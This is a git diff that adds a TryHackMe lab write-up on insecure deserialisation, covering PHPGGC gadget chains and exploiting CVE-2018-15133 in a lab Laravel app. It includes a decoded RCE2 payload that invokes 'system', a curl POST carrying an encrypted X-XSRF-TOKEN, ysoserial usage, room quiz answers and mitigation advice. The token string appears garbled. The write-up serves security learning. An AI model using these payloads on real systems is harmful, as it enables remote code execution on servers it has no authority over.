@@ -1,4 +1,4 @@
-# Insecure Deserialisation
+<img width="1141" height="58" alt="image" src="https://github.com/user-attachments/assets/6e1ae025-edb3-412c-9e82-730ed82f4989" /># Insecure Deserialisation
 
 Room: [Insecure Deserialisation](https://tryhackme.com/room/insecuredeserialisation)
 
@@ -454,7 +454,240 @@ For example, the output for `CakePHP/RCE1` means that the gadget chain named `Ca
 
 CakePHP is an open-source web development framework written in PHP. It helps developers build websites and web applications without writing everything from scratch.
 
-Additionally, you can filter gadget chains based on their capabilities, such as those targeting particular PHP frameworks or achieving specific exploit techniques, using the -l option followed by a filter keyword (Drupal, Laravel, etc.). This allows you to select the appropriate gadget chain for your exploitation scenario, as shown below:
+Additionally, you can filter gadget chains based on their capabilities, such as those targeting particular PHP frameworks or achieving specific exploit techniques, using the `-l` option followed by a filter keyword (Drupal, Laravel, etc.). This allows you to select the appropriate gadget chain for your exploitation scenario.
+
+---
+
+### Exploiting a Web Application
+
+As a pentester, we are focusing on a Laravel website to exploit a known vulnerability identified under [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/cve-2018-15133). The vulnerability is triggered when Laravel deserialises (unpacks) the untrusted data from the `X-XSRF-TOKEN`. 
+
+An `X-XSRF-TOKEN` is a security token used to prevent Cross-Site Request Forgery (CSRF) attacks in web applications.
+
+Cross-site request forgery (CSRF) is a web security vulnerability that tricks an authenticated user's browser into executing an unwanted, state-changing action on a trusted web application.
+
+This deserialisation process can lead to executing arbitrary code on the server if not handled securely. The details regarding the vulnerability can be read from the [Laravel security release](https://laravel.com/framework/docs/5.6/upgrade#upgrade-5.6.30), but our main focus will be how we can utilise PHP gadget chains during exploitation. 
+
+The vulnerability mentioned above can be exploited using three main factors:
+- **Step 1**: Requires `APP_KEY` from Laravel, which the framework uses to encrypt the `XSRF` token.
+- **Step 2**: Use PHPGGC to generate an unserialised payload executing a command. This is considered a complex task, and the tool comes to the rescue.
+- **Step 3**: Finally, we must encrypt the payload using the APP_KEY and send the POST request. This usually varies from framework to framework.
+
+`APP_KEY` is a secret encryption key used by Laravel to encrypt and decrypt sensitive application data, including cookies.
+
+An unserialized payload means data that has been converted back from its serialized format into its original PHP data structure (such as an object or array).
+
+In this task, our focus will primarily be on Step 2 and understanding how PHPGGC will assist us as a pentester. Visit the vulnerable Laravel application at `http://<MACHINE_IP>:8089`.
+
+<img width="657" height="172" alt="image" src="https://github.com/user-attachments/assets/21ee7e63-0670-4d05-bbd9-37308ced8bcf" />
+
+As a pentester, we can identify web application versions through multiple techniques. You can visit the [Information Gathering and Vulnerability Scanning module](https://tryhackme.com/module/information-gathering-and-vulnerability-scanning) to learn this in detail. 
+
+You can use the curl command `curl -I http://<MACHINE_IP>:8089/` where you can see the application version.
+
+<img width="475" height="217" alt="image" src="https://github.com/user-attachments/assets/980e9949-2148-47e6-ab5f-9fe84335c7ef" />
+
+Here you can see that the application uses PHP 7.2.10.
+
+Now we will go into detailed step-by-step exploitation:
+- For the first step, we will acquire the `APP_KEY` through any attack vector, such as social engineering. You can get the `APP_KEY` by visiting `http://<MACHINE_IP>:8089/get-key`. For your convenience, this page will also provide you with the first payload that has the `whoami` command.
+
+<img width="1143" height="161" alt="image" src="https://github.com/user-attachments/assets/f750d6e5-21c8-4eb1-95a8-3187490c3816" />
+
+- For the second step, we need to identify the payload we can use by command `php phpggc -l Laravel`.
+
+<img width="575" height="406" alt="image" src="https://github.com/user-attachments/assets/0b3027f5-292b-44fc-81e4-47c3c41d22f4" />
+
+﻿Moving forward, we can generate the payload using various gadgets. Each gadget has its relevancy and utilises different classes during the deserialisation process. We will use `RCE2` in this example and can generate the payload by typing the command `php phpggc -b Laravel/RCE2 system whoami` for a base-64 encoded payload. 
+
+<img width="1143" height="47" alt="image" src="https://github.com/user-attachments/assets/9b4050a0-325e-4b4c-a80d-784dafca872d" />
+
+A non-encoded payload is shown below by command `echo 'BASE64_PAYLOAD' | base64 -d`:
+
+<img width="1141" height="58" alt="image" src="https://github.com/user-attachments/assets/a4ff211d-56e3-4bdc-bd6c-775bae83df2c" />
+
+```
+O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{
+    s:9:"*events";
+    O:28:"Illuminate\Events\Dispatcher":1:{
+        s:12:"*listeners";
+        a:1:{
+            s:6:"whoami";
+            a:1:{
+                i:0;
+                s:6:"system";
+            }
+        }
+    }
+    s:8:"*event";
+    s:6:"whoami";
+}
+```
+
+**Breakdown of the Payload**
+
+1. `Illuminate\Broadcasting\PendingBroadcast`
+
+- This is the main Laravel object in the payload.
+- `O` represents an object.
+- `40` represents the length of the class name.
+- `2` indicates that the object contains two properties.
+- It holds the event dispatcher and the event name.
+
+In simple words: This object connects the event dispatcher with the event that needs to be triggered.
+
+2. `*events`
+
+```
+s:9:"*events";
+```
+
+- This represents a protected property named `events`.
+- It contains another Laravel object: `Illuminate\Events\Dispatcher`.
+- The dispatcher is responsible for managing and triggering events.
+
+In simple words: This property holds the object responsible for handling events.
+
+3. `Illuminate\Events\Dispatcher`
+
+- This Laravel class manages application events.
+
+- It contains a property called `listeners`.
+- This property stores the event names and their associated listeners.
+
+4. `*listeners`
+
+```
+a:1:{
+    s:6:"whoami";
+    a:1:{
+        i:0;
+        s:6:"system";
+    }
+}
+```
+
+This represents an array containing an event and its listener.
+
+| Component      | Meaning                          |
+|----------------|----------------------------------|
+| `a:1`          | An array containing one entry    |
+| `s:6:"whoami"` | Event name is `whoami`           |
+| `a:1`          | An array containing one listener |
+| `i:0`          | Array index 0                    |
+| `s:6:"system"` | Listener is the PHP `system` function |
+
+In simple words: The payload associates the whoami event with PHP's system function.
+
+5. `*event`
+
+```
+s:8:"*event";
+s:6:"whoami";
+```
+
+- This represents the protected property `event`.
+- Its value is whoami.
+- It specifies the event associated with the `PendingBroadcast` object.
+
+**Overall Working**: 
+
+The payload connects two Laravel classes:
+- `PendingBroadcast` holds the event dispatcher and the event name (`whoami`).
+- `Dispatcher` contains a `listener` mapping that associates `whoami` with the PHP system function.
+
+When the relevant Laravel methods are triggered during object processing, the gadget chain is intended to invoke the `listener`.
+
+The intended command is `whoami`, which displays the current Linux username.
+
+As we already know, Laravel initially employed encrypted and serialised cookies to securely store session and CSRF token data, using the same methodology for both. If you visit the vulnerable app, you can see the encrypted and serialised cookies, as shown below:
+
+<img width="1144" height="207" alt="image" src="https://github.com/user-attachments/assets/424c49fa-3949-4e13-b19c-d7a04b95747e" />
+
+The basic idea was to avoid tampering with data from bad actors, but nevertheless, they did not realise that even such a strong security mechanism could be breached through insecure serialisation.
+
+Now that we have the `APP_KEY` and payload, it's time to create an encrypted CSRF token. For the sake of this room, we have prepared a PHP script that would take `APP_KEY` and payload as arguments and return the encrypted token. You can access the link at `http://<MACHINE_IP>:8089/cve.php?app_key=xx&payload=xxx`. For your convenience, this URL already has the URL encoded key and first payload with the `whoami` command. Understanding the encryption mechanism for a framework like Laravel and WordPress is a simple task, but currently, it's out of the scope of the room.
+
+<img width="1145" height="156" alt="image" src="https://github.com/user-attachments/assets/6b7c8a59-9cb7-424f-96e9-121c78270d87" />
+
+When pen-testing web frameworks like Yii, CakePHP, and Laravel, it's essential to understand that each framework has unique routing and encryption mechanisms despite all being built on PHP. 
+
+Now that we have the encrypted token, we can make a simple `POST` request using the CSRF token as shown below to execute the command. The payload result will appear at the start of the `cURL` response.
+
+`curl 10.48.149.0:8089 -X POST-H 'X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWXCSFINHC9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVSNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM
+115SnZ30VdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWcZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUYNU NHTGØRRLNqWkxDSU9v5lI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ@eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjh
+OSUh5bjl@MitUeEx2Y281VTZUY29Ea@kyRiIsIm1hYyI6ImE10GY2MjBhZThmYjdhMTgyMzA1M2IwNGEXZmJkZTMzOTA2ZDBHMDI5N2Y30WQzNDYwNzJjZTgyNjIzNmFhMTMifQ='| head -n 2`
+
+<img width="1146" height="143" alt="image" src="https://github.com/user-attachments/assets/f7d56782-69fe-49f8-a7ff-06e9dc5cd3ec" />
+
+---
+
+### Ysoserial for Java
+
+Ysoserial is a widely recognised exploitation tool specifically crafted to test the security of Java applications against serialisation vulnerabilities. It helps generate payloads that exploit these vulnerabilities, making it an essential tool for attackers and penetration testers who aim to assess and exploit applications that use Java serialisation.
+
+To use Ysoserial, an attacker would typically generate a payload with a command such as `java -jar ysoserial.jar [payload type] '[command to execute]'`, where `[payload type]` is the type of exploit and `[command to execute]` is the arbitrary command they wish to run on the target system. 
+
+For example, using the `CommonsCollections1` payload type might look like this: `java -jar ysoserial.jar CommonsCollections1 'calc.exe'`. This command generates a serialised object that will execute the specified command when deserialised by a vulnerable application.
+
+Ysoserial is available for [download](https://github.com/frohoff/ysoserial) on GitHub.
+
+---
+
+### Answer the questions below
+
+1. What is the vector for exploiting CodeIgniter4/FR1 as per the PHPGGC?
+
+`__toString`
+
+<img width="479" height="111" alt="image" src="https://github.com/user-attachments/assets/855f196d-1e15-41ee-91fb-546aced91256" />
+
+
+2. What is the output of the whoami command on the vulnerable Laravel application?
+
+`root`
+
+3. What is the output of the `uname -r` command on the vulnerable Laravel application?
+
+
+
+## Mitigation Measures
+
+Mitigating the risks associated with insecure deserialisation is paramount in ensuring the security of a web application. By implementing effective defence measures, organisations can significantly reduce the likelihood of exploitation and mitigate potential damage. We will discuss this from the perspective of the red team/pentester and the secure code. 
+
+---
+
+### Red Teamer / Pentester Perspective
+
+- **Codebase analysis**: Conduct a comprehensive review of the application's serialisation mechanisms. Identify potential points of deserialisation and serialisation throughout the codebase.
+- **Vulnerability identification**: Use static analysis tools to detect insecure deserialisation vulnerabilities. Look for improper input validation, insecure libraries, and outdated dependencies.
+- **Fuzzing and dynamic analysis**: Employ fuzzing techniques to generate invalid or unexpected input data. Use dynamic analysis tools to monitor the application's behaviour during runtime.
+- **Error handling assessment**: Evaluate how the application handles errors during deserialisation. Look for potential error messages or stack traces that reveal system details.
+
+---
+
+### Secure Coder Perspective
+
+- **Avoid insecure serialisation formats**: Avoid using inherently insecure serialisation formats like Java serialisation. Choose safer alternatives such as JSON or XML with robust validation mechanisms.
+- **Avoid eval and exec**: Avoid using `eval()` and `exec()` functions, as they can execute arbitrary code and pose a significant security risk.
+- **Input validation and output encoding**: Implement stringent input validation to ensure that only expected data is accepted. Apply output encoding techniques to sanitise data before serialisation.
+- **Secure coding practices**: Follow secure coding practices recommended by security standards and guidelines. Adopt principles such as least privilege, defence in depth, and fail-safe defaults.
+- **Adherence to guidelines**: Established secure coding guidelines specific to the programming language or framework.
+
+---
+
+### Answer the questions below
+
+Is it a good practice to blindly use the `eval()` function in your code? (yea/nay)
+
+nay
+
+
+
+
+
+
+
 
 
 
